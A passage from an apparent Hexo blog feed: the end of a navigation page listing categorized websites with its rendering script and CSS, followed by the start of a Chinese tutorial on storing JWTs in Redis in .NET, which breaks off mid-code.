陪你做生活的设计师（创意灵感天堂，搜索、发现设计灵感、设计素材）"        },        {            "title": "修剪mp3",            "url": "https://audiotrimmer.com/cn",            "img": "https://audiotrimmer.com/images/logo.png?v=1 ",            "description": "Audio Trimmer 是一个简单的在线工具，可让您即时修剪mp3和其他音频文件"        },        {            "title": "制作ico",            "url": "https://www.bitbug.net/",            "img": "",            "description": "在线制作ico图标 | 在线ico图标转换工具 方便制作favicon.ico"        },        {            "title": "今日热榜",            "url": "https://tophub.today/",            "img": "https://file.ipadown.com/tophub/assets/images/logo.png",            "description": "今日热榜,Tophub,热门新闻,今日头条,热搜,热词,新闻聚合"        },        {            "title": "抖音/TikTok/Bili下载",            "url": "https://snapany.com/zh/tiktok",            "img": "https://snapany.com/favicon.ico",            "description": "TikTok 哔哩哔哩 Pinterest Facebook VK Snapchat Threads 视频图片 Suno音乐 "        }    ]},{    "category": "AI",    "items": [       {            "title": "kimi",            "url": "https://kimi.ai/",            "img": "https://ecmb.bdimg.com/tam-ogel/-1772417172_-552089199_88_88.jpg ",            "description": "kimi"        },      {            "title": "讯飞星火",            "url": "https://xinghuo.xfyun.cn/",            "img": "https://fc1tn.baidu.com/it/u=1861166136,3857095671&fm=202&mola=new&crop=v1",            "description": "讯飞星火大模型，科大讯飞"        },       {            "title": "腾讯AI代码",            "url": "https://copilot.tencent.com/chat",            "img": "https://acc-1258344699.cos.accelerate.myqcloud.com/web/website/assets/logo_text-BjFpEzKf.png",            "description": "腾讯云 AI 代码助手"        },        {            "title": "AI导航",            "url": "https://www.ainavpro.com/",            "img": "https://www.ainavpro.com/wp-content/uploads/2023/03/logo-8-e1677916867522.png",            "description": "ai导航,ai产品,ai写作,chatgpt,人工智能"        },        {            "title": "AI万花筒",            "url": "https://www.aiwht.com/",            "img": "https://ai-img.aiwht.com/wp-content/uploads/2023/03/1680232059212_AI%E5%88%86%E5%BC%80%E7%9A%84-360x80-1.png",            "description": "AI万花筒| ai导航 连接AI新世界"        },        {            "title": "快手-可灵",            "url": "https://kolors.kuaishou.com/",            "img": "https://ali2.a.kwimgs.com/kos/nlav10378/aiwp/assets/kling-logo-zh-5iJvXAUm.png",            "description": "快手-可灵，生成图片/视频"        },        {            "title": "通情",            "url": "https://tongyi.aliyun.com/qianwen/",            "img": "https://img.alicdn.com/imgextra/i1/O1CN01asLYeX1WhbsyEZn5u_!!6000000002820-55-tps-56-56.svg",            "description": "通情、达义，你的全能AI助手"        },        {            "title": "豆包-字节",            "url": "https://www.doubao.com/chat/",            "img": "https://ecmb.bdimg.com/tam-ogel/1797406267_1647065546_88_88.jpg",            "description": "豆包是字节跳动公司基于云雀模型开发的AI工具，提供聊天机器人、写作助手以及英语学习助手等功能"        },        {            "title": "文心一言",            "url": "https://yiyan.baidu.com/",            "img": "https://nlp-eb.cdn.bcebos.com/static/eb/asset/logo.8a6b508d.png",            "description": "写文案、想点子，又能陪你聊天、答疑解惑。"        },        {            "title": "marscode",            "url": "https://www.marscode.cn/",            "img": "https://p9-arcosite.byteimg.com/tos-cn-i-goo7wpa0wc/8f2f23baeb3c4be4ade7804de39aec5a~tplv-goo7wpa0wc-image.image",            "description": "豆包旗下的编程助手，提供智能补全、智能预测、智能问答等能力"        },        {            "title": "suno",            "url": "https://suno.com/",            "img": "https://pbs.twimg.com/profile_images/1807517561598181376/tgNisKbX.jpg",            "description": "Suno is building a future where anyone can make great music."        },        {            "title": "ollama",            "url": "https://ollama.com/ ",            "img": "https://ollama.com/public/ollama.png",            "description": "Run Llama, Phi, Mistral, Gemma   Get up and running with large language models."        },        {            "title": "Cursor",            "url": "https://www.cursor.com/",            "img": "https://avatars.githubusercontent.com/u/126759922?s=48&v=4",            "description": "The AI Code Editor"        },        {            "title": "Ai导航",            "url": "https://www.ainavpro.com/",            "img": "https://www.ainavpro.com/wp-content/uploads/2023/03/logo-8-e1677916867522.png",            "description": "Ai导航 | 最新最前沿的ai产品"        },        {            "title": "AI工具集",            "url": "https://ai-bot.cn/",            "img": "https://ai-bot.cn/wp-content/uploads/2023/03/ai-bot-logo-black.png",            "description": "1000+ AI工具集合，国内外AI"        }    ]},{    "category": "Web",    "items": [                 {            "title": "有谱么",            "url": "https://yopu.co/",            "img": "https://cdn.yopu.co/img/qrcode_app_download.436360b7.png",            "description": "有谱么是专为手机设计的吉他尤克里里曲谱书"        },           {            "title": "什么值得买",            "url": "https://www.smzdm.com/",            "img": "https://t9.baidu.com/it/u=149758115,4084685086&fm=190&app=131&size=f242,150&n=0&f=JPEG",            "description": "什么值得买 | 科学消费 认真生活"        },      {            "title": "vscode",            "url": "https://code.visualstudio.com/ ",            "img": "https://visualstudio.microsoft.com/wp-content/uploads/2019/09/vs-code-responsive-01-1.png",            "description": "visualstudio code "        },      {            "title": "IT桔子",            "url": "https://www.itjuzi.com/",            "img": "https://static.itjuzi.com/images/fSxSdAmviPF7Cxd0aJvnwOTjTJPAQ5AHOscYuWTq.png",            "description": "IT桔子 | 泛互联网创业投资项目信息数据库及商业信息服务商"        },       {            "title": "千通彩色库",            "url": "https://www.qtccolor.com/secaiku/",            "img": "https://cdn.qtccolor.com/images/logo.png",            "description": "在线色号色彩查询 - 千通彩色库"        },               {            "title": "X API ",            "url": "https://developer.x.com/en/products/x-api",            "img": "https://ms.bdimg.com/pacific/0/pic/-1749260314_-150371495.jpg",            "description": "X API | Twitter Developer Platform  "        },               {            "title": "IG/FB API",            "url": "https://developers.facebook.com/",            "img": "https://images.sftcdn.net/images/t_app-icon-m/p/f96df87d-926f-4954-bf58-f377a573a630/3410194445/instagram-Instagram_icon.png",            "description": "Instagram API | Facebook for Developers"        },               {            "title": "TgApi",            "url": "https://core.telegram.org/",            "img": "https://t8.baidu.com/it/u=4184704855,1261911938&fm=217&app=126&size=f242,150&n=0&f=JPEG",            "description": "Telegram APIs"        },               {            "title": "TikTokDev",            "url": "https://developers.tiktok.com/",            "img": "https://t7.baidu.com/it/u=3496169845,3458702159&fm=217&app=126&size=f242,150&n=0&f=JPEG",            "description": "TikTok for Developers"        },               {            "title": "小红书开放平台",            "url": "https://miniapp.xiaohongshu.com/",            "img": "https://t8.baidu.com/it/u=1809095286,1432785828&fm=217&app=126&size=f242,150&n=0&f=JPEG",            "description": "小红书开放平台"        },          {            "title": "白鲸出海",            "url": "https://www.baijing.cn/",            "img": " https://www.baijing.cn/static/img/logo_black.png?v=2",            "description": "移动出海,海外开发者,白鲸出海,白鲸社区"        },                 {            "title": "无限音乐",            "url": "http://ws.wxmp3.com/",            "img": "http://ws.wxmp3.com/style/images/logo.png",            "description": "无限音乐网|MP3歌曲免费下载,全网MP3免费下载,歌曲下载神器"        },               {            "title": "FreeBuf",            "url": "https://www.freebuf.com/",            "img": "https://www.freebuf.com/images/logoMax.png",            "description": "网络安全行业门户"        },                 {            "title": "eName",            "url": "https://auction.ename.com/tao",            "img": "https://t9.baidu.com/it/u=2971182524,3144420648&fm=190&app=131&size=f242,150&n=0&f=JPEG",            "description": "淘域名 | 域名交易平台：eName.Com"        },               {            "title": "又拍云",            "url": "https://www.upyun.com/",            "img": "https://t9.baidu.com/it/u=3516235917,278845167&fm=190&app=131&size=f242,150&n=0&f=JPEG",            "description": "又拍云 加速在线业务 CDN加速 云存储"        },               {            "title": "UCloud ",            "url": "https://www.ucloud.cn/",            "img": "https://fc1tn.baidu.com/it/u=2776782969,1600626072&fm=202&mola=new&crop=v1",            "description": "云服务器_ UCloud云计算"        },         {            "title": "七牛云",            "url": "https://www.qiniu.com/",            "img": "https://ecmb.bdimg.com/tam-ogel/600520814_947783485_500_500.png",            "description": "七牛云,七牛云大促,cdn,对象存储,云主机,云短信"        },                {            "title": "在线Ping检测",            "url": "https://www.cesu.net/",            "img": "https://www.cesu.net/storage/default/20240422/3537817137167267a7ff56749fd79a407e9a98a25325e34d1a7a31b.jpg",            "description": "免费Ping测试工具-网站在线测速工具"        },        {            "title": "京东宙斯",            "url": "https://jos.jd.com/",            "img": "https://img12.360buyimg.com/imagetools/s200x200_jfs/t1/118697/14/19219/13380/5f8597bfEe2f1a7a6/28da4f4bd65f005c.png",            "description": "京东宙斯开发者中心、京东开放平台、京东API、宙斯开放平台、京东宙斯、京东接口"        },        {            "title": "拼多多开放平台",            "url": "https://open.pinduoduo.com/",            "img": "https://cdn.pinduoduo.com/upload/home/img/common/pdd_logo_v2.png",            "description": "拼多多开放平台"        },        {            "title": "抖店",            "url": "https://op.jinritemai.com/home",            "img": "https://ecmb.bdimg.com/tam-ogel/1876914726_1076566012_88_88.png",            "description": "抖店服务市场，基于抖店数据与接口，赋能内容电商生态，服务商家与开发者"        },        {            "title": "阿里百川",            "url": "https://baichuan.taobao.com/ ",            "img": "https://img.alicdn.com/tps/TB13Od5LpXXXXX_XXXXXXXXXXXX-150-50.png",            "description": "阿里百川-阿里巴巴无线开放平台,移动开放的主阵地"        },        {            "title": "阿里云域名",            "url": "https://mi.aliyun.com/",            "img": "https://t7.baidu.com/it/u=4057341977,137104390&fm=190&app=131&size=f242,150&n=0&f=PNG",            "description": "阿里云域名交易 "        },        {            "title": "聚名网",            "url": "https://www.juming.com/ykj/",            "img": "https://www.juming.com/pub/img/new/logo.png",            "description": "聚名网提供一口价域名购买"        },        {            "title": "爱名网",            "url": "https://am.22.cn/ykj",            "img": "https://am.22.cn/images/logo.png",            "description": "一口价域名交易-域名买卖交易中心-爱名网AM.22.CN"        }  ,       {            "title": "apple",            "url": "https://apple.com/",            "img": "https://ecmb.bdimg.com/tam-ogel/2066431224_743698567_88_88.png",            "description": "apple"        },             {            "title": "脉脉",            "url": "https://maimai.cn/",            "img": "https://s.taou.com/static/images/website/pc/logo.png",            "description": "脉脉,脉脉官网,脉脉APP,maimai"        },      {            "title": "AI tool",            "url": "https://saasaitools.com/",            "img": "https://saasaitools.com/wp-content/uploads/2023/12/saasaitools_logowhite-1536x327.webp",            "description": " SaaS AI Tools AI tool"        },      {            "title": "Newest AI Tools",            "url": "https://theresanaiforthat.com/",            "img": "https://theresanaiforthat.com/favicon-large.png",            "description": "Newest AI Tools  There's An AI For That® - Discover The Newest And Best AI Tools"        },      {            "title": "uni-app",            "url": "https://dcloud.io/ ",            "img": "https://t7.baidu.com/it/u=1571091084,4105095099&fm=217&app=126&size=f242,150&n=0&f=PNG",            "description": "uni-app,uniapp,HBuilderX "        },         {            "title": "小米",            "url": "https://www.mi.com/",            "img": "https://ms.bdimg.com/pacific/0/pic/1990065745_1296829299.jpg",            "description": "小米 每个人都能享受科技带来的美好生活"        },        {            "title": "forbes",            "url": "https://www.forbes.com/billionaires/ ",            "img": "https://www.forbeschina.com/static/images/logo.png",            "description": "forbes福布斯"        },{                        title: "华为",                        url: "https://consumer.huawei.com/",                        img: "https://t9.baidu.com/it/u=2184693209,621087203&fm=190&app=131&size=f242,150&n=0&f=JPEG",                        description: "华为, HUAWEI, HUAWEI官网, 华为官网, 华为网站, 华为消费者官网, 华为产品, 华为新品"                    }    ]},{    "category": "Hexo",    "items": [        {            "title": "Hipaper",            "url": "https://github.com/iTimeTraveler/hexo-theme-hipaper",            "img": "https://hexo.io/themes/screenshots/Hipaper.jpg",            "description": "A fashional newspaper, blog theme for Hexo."        },        {            "title": "Fluid ",            "url": "https://github.com/fluid-dev/hexo-theme-fluid",            "img": "https://hexo.io/themes/screenshots/Fluid.jpg",            "description": "An elegant and light theme"        },        {            "title": "keep",            "url": "https://github.com/XPoet/hexo-theme-keep",            "img": "https://hexo.io/themes/screenshots/Keep.jpg",            "description": "keep writing keep loving"        },        {            "title": "A4",            "url": "https://github.com/HiNinoJay/hexo-theme-A4",            "img": "https://hexo.io/themes/screenshots/A4.jpg",            "description": "A hexo theme that looks like an A4 paper."        },        {            "title": "Edinburgh",            "url": "https://github.com/sharvaridesai/hexo-theme-edinburgh",            "img": "https://hexo.io/themes/screenshots/Edinburgh.jpg",            "description": "Clean, beautiful portfolio theme"        },        {            "title": "Freemind",            "url": "https://github.com/wzpan/hexo-theme-freemind",            "img": "https://hexo.io/themes/screenshots/Freemind.jpg",            "description": "Fully taking advantages of Bootstrap"        },        {            "title": "Aurora ",            "url": "https://github.com/auroral-ui/hexo-theme-aurora",            "img": "https://hexo.io/themes/screenshots/Aurora.jpg",            "description": "Futuristic auroral Hexo theme."        },        {            "title": "Reimu",            "url": "https://github.com/D-Sketon/hexo-theme-reimu",            "img": "https://hexo.io/themes/screenshots/Reimu.jpg",            "description": "一款博丽灵梦风格的Hexo主题 | A Hakurei Reimu style Hexo theme."        },        {            "title": "Lightx",            "url": "https://github.com/songquanpeng/hexo-theme-lightx",            "img": "https://hexo.io/themes/screenshots/Lightx.jpg",            "description": "A pure and simple Hexo theme"        },        {            "title": "Terminal ",            "url": "https://github.com/lazysheep666/terminal_theme",            "img": "https://hexo.io/themes/screenshots/Terminal.jpg",            "description": "A simple and clean theme"        },        {            "title": "Replica ",            "url": "https://github.com/sabrinaluo/hexo-theme-replica",            "img": "https://hexo.io/themes/screenshots/Replica.jpg",            "description": "A github style replication theme"        },        {            "title": "leedom",            "url": "https://github.com/leedom92/hexo-theme-leedom",            "img": "https://hexo.io/themes/screenshots/leedom.jpg",            "description": "A pure hexo theme."        },        {            "title": "Meow",            "url": "https://github.com/chanwj/hexo-theme-meow",            "img": "https://hexo.io/themes/screenshots/Meow.jpg",            "description": "A cute and bright hexo theme suitable for literary creation ( e.g. serial novel, fanfiction )."        },        {            "title": "Hiero",            "url": "https://github.com/iTimeTraveler/hexo-theme-hiero",            "img": "https://hexo.io/themes/screenshots/Hiero.jpg",            "description": "A free magazine and blog style theme"        },        {            "title": "Vita ",            "url": "https://github.com/Harendra1993/vita",            "img": "https://hexo.io/themes/screenshots/Vita.png",            "description": "A simple and minimal Hexo resume theme"        },        {            "title": "Sakura ",            "url": "https://github.com/honjun/hexo-theme-sakura",            "img": "https://hexo.io/themes/screenshots/Sakura.jpg",            "description": "A beautiful theme"        },        {            "title": "Nayo ",            "url": "https://github.com/Lemonreds/hexo-theme-nayo",            "img": "https://hexo.io/themes/screenshots/Nayo.jpg",            "description": "A clean theme"        },        {            "title": "xoxo-plus ",            "url": "https://github.com/fooying/hexo-theme-xoxo-plus",            "img": "https://hexo.io/themes/screenshots/xoxo-plus.jpg",            "description": "A Simple Template"        },        {            "title": "Waline",            "url": "https://waline.js.org/",            "img": "https://waline.js.org/logo.png",            "description": "一款简洁、安全的评论系统。"        },        {            "title": "Valine",            "url": "https://valine.js.org/",            "img": "https://valine.js.org/images/valine.png",            "description": "一款快速、简洁且高效的无后端评论系统。"        },        {            "title": "来必力",            "url": "https://livere.com/",            "img": "https://livere.com/img/nav/logo_livere_main-colored_zh.png",            "description": "来必力提供社交化评论，社交化登录，我的页面，SNS分享按钮"        }    ]},{                category: "Fun",                items: [       {            "title": "兰博基尼",            "url": "https://www.lamborghini.com/ ",            "img": "https://t9.baidu.com/it/u=637130529,2781676095&fm=217&app=126&size=f242,150&n=0&f=JPEG",            "description": "兰博基尼汽车官方网站"        },                          {            "title": "vivo",            "url": "https://www.vivo.com/",            "img": "https://ecmb.bdimg.com/tam-ogel/-1540521831_1768335019_88_88.png",            "description": " vivo，vivo官网，vivo智能手机"        },                    {                        title: "哔哩哔哩",                        url: "https://www.bilibili.com/",                        img: "https://activity.hdslb.com/zzjs/20160608appDownload/img/pc/tittle.png",                        description: "哔哩哔涛"                    },                    {                        title: "youtube",                        url: "https://www.youtube.com/",                        img: "https://t8.baidu.com/it/u=1745702888,2743145560&fm=217&app=126&size=f242,150&n=0&f=JPEG",                        description: "youtube"                    }                ]            },            {                category: "Game",                items: [                   {            "title": "byrut ",            "url": "https://byrutgame.org/",            "img": "https://byrutgame.org/templates/byrut_upd/images/logo.png",            "description": "byrut Cкачать игры на "        },       {            "title": "螃蟹",            "url": "https://www.pxb7.com/",            "img": "https://www.pxb7.com/img/logo.45da5e95.png",            "description": "螃蟹游戏账号交易代售平台"        },       {            "title": "交易猫",            "url": "https://www.jiaoyimao.com/",            "img": "https://t9.baidu.com/it/u=3394740754,1697665746&fm=190&app=131&size=f242,150&n=0&f=JPEG",            "description": "交易猫_手游交易平台"        },                    {                        title: "雷电模拟器",                        url: "https://www.ldmnq.com/",                        img: "https://res.ldmnq.com/gw/static/gw_ch/dist/client/img/logo.c0fc5c8.svg",                        description: "雷电安卓模拟器"                    },                    {                        title: "biubiu加速器",                        url: "https://www.biubiu001.com/",                        img: "https://res.biubiu001.com/web/www/img/header_biubiu_logo.3f871d8e.png",                        description: "biubiu加速器_免费的手游加速器_电竞级PC网游加速器"                    },                    {                        title: "isaac wiki",                        url: "https://isaac.huijiwiki.com/wiki/T130",                        img: "https://av.huijiwiki.com/site_avatar_isaac_l.png?1732216641",                        description: "isaac wiki"                    }                ]            }        ];        function renderCards(data) {            let html = '';            data.forEach(category => {                html += `<div class="d-flex flex-fill">                            <h4 class="text-gray text-lg mb-4">                                <i class="site-tag iconfont icon-tag icon-lg mr-1" id="${category.category}"></i>                               ${category.category}                            </h4>                            <div class="flex-fill"></div>                        </div>                        <div class="row">`;                category.items.forEach(item => {                    html += `                        <div class="url-card col-6 col-sm-6 col-md-4 col-xl-5a col-xxl-6a">                            <div class="url-body default">                                <a href="${item.url}" target="_blank" class="card no-c mb-4">                                    <div class="card-body">                                        <div class="url-content d-flex align-items-center">                                            <div class="url-img mr-2 d-flex align-items-center justify-content-center">                                                <img class="lazy loaded" src="${item.img}" onerror="javascript:this.src='/images/logo.svg'" alt="${item.title}">                                            </div>                                            <div class="url-info flex-fill">                                                <div class="text-sm overflowClip_1">                                                    <strong>${item.title}</strong>                                                </div>                                                <p class="overflowClip_1 m-0 text-muted text-xs">${item.description}</p>                                            </div>                                        </div>                                    </div>                                </a>                                <a href="${item.url}" class="togo text-center text-muted is-views">                                    <i class="iconfont icon-goto"></i>                                </a>                            </div>                        </div>`;                });                html += `</div>`;            });            return html;        }        document.getElementById('app3').innerHTML = renderCards(data);    </script><!-- https://banjinmei.github.io/2023/02/20/T100/https://camp.honorofkings.com/studio?home=%2Fembed%2Fhok-studio%2Fprofile#/home https://www.itshujia.com/read/go-zero-cloud/333.html   go lang sutdyhttps://banjinmei.github.io/2024/04/21/HarmonyOS-Base/  myhmhttps://banjinmei.github.io/2024/06/05/Azure-OpenAI%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/ ai--><style>@media (min-width:1200px){.col-xl-5a{flex:0 0 20%;max-width:20%}.col-xl-6a{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-xl-7a{flex:0 0 14.285714%;max-width:14.285714%}.col-xl-8a{flex:0 0 12.5%;max-width:12.5%}}@media (min-width:1400px){ .container-lg{max-width:1340px}}@media (min-width: 1680px){.d-xxl-block{display:block!important}.col-xxl-auto{-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:100%}.col-xxl-1{-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-xxl-2{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-xxl-3{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-xxl-4{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-xxl-5{-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-xxl-6{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-xxl-7{-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-xxl-8{-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-xxl-9{-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-xxl-10{-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-xxl-11{-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-xxl-12{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.col-xxl-5a{flex:0 0 20%;max-width:20%}.col-xxl-6a{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-xxl-7a{flex:0 0 14.285714%;max-width:14.285714%}.col-xxl-8a{flex:0 0 12.5%;max-width:12.5%}.col-xxl-10a{flex:0 0 10%;max-width:10%}.mx-xxl-n5{margin-left:-5rem!important;margin-right:-5rem!important}.container-lg{max-width:1400px}}.row {    display: -ms-flexbox;    display: flex;    -ms-flex-wrap: wrap;    flex-wrap: wrap;    margin-right: -15px;    margin-left: -15px}.size-50{width:50px;height:50px}.size-70{width:70px;height:70px}.flex-wrap-reverse {    -ms-flex-wrap: wrap-reverse!important;    flex-wrap: wrap-reverse!important}.flex-fill {    -ms-flex: 1 1 auto!important;    flex: 1 1 auto!important}.flex-grow-0 {    -ms-flex-positive: 0!important;    flex-grow: 0!important}.flex-grow-1 {    -ms-flex-positive: 1!important;    flex-grow: 1!important}.flex-shrink-0 {    -ms-flex-negative: 0!important;    flex-shrink: 0!important}.flex-shrink-1 {    -ms-flex-negative: 1!important;    flex-shrink: 1!important}.justify-content-start {    -ms-flex-pack: start!important;    justify-content: flex-start!important}.justify-content-end {    -ms-flex-pack: end!important;    justify-content: flex-end!important}.justify-content-center {    -ms-flex-pack: center!important;    justify-content: center!important}.text-gray{color:#555}.overflowClip_1{overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;word-break:break-all;display:-webkit-box!important;-webkit-line-clamp:1;-webkit-box-orient:vertical}.overflowClip_1{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;display:block!important}.overflowClip_2{overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;word-break:break-all;display:-webkit-box!important;-webkit-line-clamp:2;-webkit-box-orient:vertical}.url-card .url-body{transform:translateY(0px);-webkit-transform:translateY(0px);-moz-transform:translateY(0px);-webkit-transition:all 0.3s ease;-moz-transition:all 0.3s ease;-o-transition:all 0.3s ease;transition:all 0.3s ease}.url-card .url-body:hover{transform:translateY(-6px);-webkit-transform:translateY(-6px);-moz-transform:translateY(-6px);box-shadow:0 26px 40px -24px rgba(0,36,100,.3);-webkit-box-shadow:0 26px 40px -24px rgba(0,36,100,.3);-moz-box-shadow:0 26px 40px -24px rgba(0,36,100,.3)}.url-card .url-like{position:absolute;top:5px;right:10px;opacity:0;transition:opacity .3s}.url-card .url-body:hover .url-like{opacity:1}.url-card .url-info{overflow:hidden;padding-right:5px}.url-card .url-goto-after{height:24px;border-top:1px solid rgba(136,136,136,.2)}.url-card .url-goto{position:absolute;bottom:0;left:0px;right:0}.url-card .card-body{padding:.938rem}.url-card .url-img{width:120px;height:100px;-webkit-box-flex:0;-ms-flex:none;flex:none;background:rgba(255, 255, 255, 0);display:flex;align-items:center;overflow:hidden}.url-card .url-img>img{max-height:100%;vertical-align:unset}.url-card .max .url-img{width:60px;height:60px}.url-card .mini .url-img{width:25px;height:25px}.url-card .post-min .url-img{width:20px;height:20px}.url-card .post-min .url-img>img{vertical-align:unset}.url-card.wechat a.card:after{content:'\e60d';position:absolute;display:inline-block;font-family:"iconfont";font-size:66px;color:#888;margin-left:10px;bottom:-15px;right:10px;opacity:.15}.url-card.down a.card:after{content:'\e604';position:absolute;display:inline-block;font-family:"iconfont";font-size:60px;color:#888;margin-left:10px;bottom:-10px;right:10px;opacity:.15}.url-card.down .mini a.card:after,.url-card.wechat .mini a.card:after{font-size:30px;margin-left:10px;bottom:-5px;right:10px}.url-card.down .max a.card:after,.url-card.wechat .max a.card:after{font-size:30px;bottom:25px}.url-card .mini a.togo,.url-card .default a.togo{position:absolute;top:20px;right:0;width:30px;height:30px;line-height:30px;opacity:.2;transition:opacity .3s} .url-card .mini a.togo{top:4px}.url-card .url-body:hover a.togo{opacity:1}.url-card .max a.togo{margin-left:auto}.url-card .max .tga{width:calc(100% - 15px);overflow:hidden}.url-card .max .tga a{font-size:75%;padding:.125rem .4rem;background:rgba(134,134,134,.1);color:#888;border-radius:10px;transition:.3s}.url-card .max .tga a:not(.no-tag):hover{background:#f1404b;color:#fff}.home-like{cursor:pointer}.home-like:hover{color:#f1404b}.home-like-hide{opacity:0!important;transform:scale(3) translateY(-25px)!important}.url-card a.togo:hover i{text-shadow:0 0 5px} .panel-body .url-card.shortcode-url .card{background:rgba(136,136,136,.1)}.url-card .remove-site,.url-card .remove-cm-site{position:absolute;top:-8px;right:0;font-size:20px;color:#f1404b;line-height:20px}.url-card .mini .card-body{padding:0.4rem 0.5rem}.edit .url-card.sortable{cursor:move}.edit .url-card.sortable .url-body a{pointer-events:none}.edit .url-card.sortable .url-body:hover{transform:initial;box-shadow:initial}.article-entry p, .article-entry table{margin:0}.keep-markdown-body a{    border-bottom: 0rem solid var(--text-color-4);}.mb-4{flex-direction: row-reverse;}.keep-markdown-body img{box-shadow:0 0 0xrem var(--shadow-color)}.post-content-container .border-box{background:#B6E0F9;}     </style>]]></content>
    
    
      
      
    <summary type="html">&lt;div&gt;
&lt;a href=&quot;#Study&quot;&gt;Study&lt;/a&gt;
&lt;a href=&quot;#Tools&quot;&gt;Tools&lt;/a&gt;
&lt;a href=&quot;#AI&quot;&gt;AI&lt;/a&gt;
&lt;a href=&quot;#Hexo&quot;&gt;Hexo&lt;/a&gt;
&lt;a href=&quot;#Fun&quot;&gt;Fun&lt;/a&gt;
&lt;a href=&quot;#G</summary>
      
    
    
    
    <category term="技术" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="Navigation" scheme="https://banjinmei.github.io/tags/Navigation/"/>
    
    <category term="nav" scheme="https://banjinmei.github.io/tags/nav/"/>
    
  </entry>
  
  <entry>
    <title>jwt redis</title>
    <link href="https://banjinmei.github.io/2024/12/03/jwt-redis/"/>
    <id>https://banjinmei.github.io/2024/12/03/jwt-redis/</id>
    <published>2024-12-02T17:20:03.000Z</published>
    <updated>2024-12-03T18:10:52.214Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redis-JWT"><a href="#Redis-JWT" class="headerlink" title="Redis JWT"></a>Redis JWT</h1><p>在 .NET 中使用 Redis 来存储 JWT（JSON Web Token）可以通过多种方式实现，<br>例如在用户登录时将生成的 JWT 存储在 Redis 中以便于后续验证和管理。</p><p>实现步骤</p><h1 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a>引入依赖</h1><p>确保你的项目引入了以下必要的 NuGet 包：</p><p>Microsoft.AspNetCore.Authentication.JwtBearer：用于 JWT 身份验证。<br>StackExchange.Redis：用于与 Redis 通信。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dotnet add package Microsoft.AspNetCore.Authentication.JwtBearer</span><br><span class="line">dotnet add package StackExchange.Redis</span><br></pre></td></tr></table></figure><h1 id="配置-Redis-客户端"><a href="#配置-Redis-客户端" class="headerlink" title="配置 Redis 客户端"></a>配置 Redis 客户端</h1><p>设置 Redis 的连接和操作。</p><h1 id="生成-JWT"><a href="#生成-JWT" class="headerlink" title="生成 JWT"></a>生成 JWT</h1><p>根据用户信息生成 JWT 并将其存储到 Redis。</p><h1 id="验证-JWT"><a href="#验证-JWT" class="headerlink" title="验证 JWT"></a>验证 JWT</h1><p>在验证阶段从 Redis 检查 token 是否有效。</p><h1 id="实现-Token-的失效机制"><a href="#实现-Token-的失效机制" class="headerlink" title="实现 Token 的失效机制"></a>实现 Token 的失效机制</h1><p>利用 Redis 的 TTL（过期时间）特性来管理 token 的生命周期。</p><h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><h2 id="1-配置-Redis-客户端"><a href="#1-配置-Redis-客户端" class="headerlink" title="1. 配置 Redis 客户端"></a>1. 配置 Redis 客户端</h2><p>在 Program.cs 或 Startup.cs 中配置 Redis 和 JWT 身份验证：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.AspNetCore.Authentication.JwtBearer;</span><br><span class="line"><span class="keyword">using</span> Microsoft.Extensions.DependencyInjection;</span><br><span class="line"><span class="keyword">using</span> Microsoft.IdentityModel.Tokens;</span><br><span class="line"><span class="keyword">using</span> StackExchange.Redis;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> builder = WebApplication.CreateBuilder(args);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Redis 配置</span></span><br><span class="line">builder.Services.AddSingleton&lt;IConnectionMultiplexer&gt;(sp =&gt;</span><br><span class="line">    ConnectionMultiplexer.Connect(<span class="string">&quot;localhost:6379&quot;</span>)); <span class="comment">// 替换为你的 Redis 地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// JWT 配置</span></span><br><span class="line"><span class="keyword">var</span> key = <span class="string">&quot;YourSecretKeyForJwt&quot;</span>; <span class="comment">// 替换为你的密钥</span></span><br><span 